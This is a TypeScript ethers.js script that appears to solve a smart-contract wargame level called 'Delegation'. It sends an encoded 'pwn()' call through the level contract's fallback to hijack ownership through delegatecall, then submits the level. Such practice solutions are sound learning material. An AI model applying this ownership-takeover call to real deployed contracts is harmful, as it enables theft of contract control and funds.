import { ethers } from "ethers";
import { getSigner } from "./signer";

import { BigNumber, BytesLike } from "ethers";
import { Interface } from "ethers/lib/utils";
import { ProxyCall__factory } from "../typechain";


import { ProxyCall } from "../typechain/ProxyCall";
import { createLevel, submitLevel } from "./utils";
async function main() {
  const signer = getSigner();
  const level = await createLevel(signer,"Delegation");

  const iface = new Interface([
    "function pwn()",
  ]);
  // this actually require proxy contract. only contract call external method
  const maliciousCall: BytesLike = iface.encodeFunctionData("pwn", []);
  console.log(maliciousCall)

  await (await signer.sendTransaction({to:level,  data:maliciousCall, gasLimit:852000})).wait();
  await submitLevel(signer, level);

}
main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
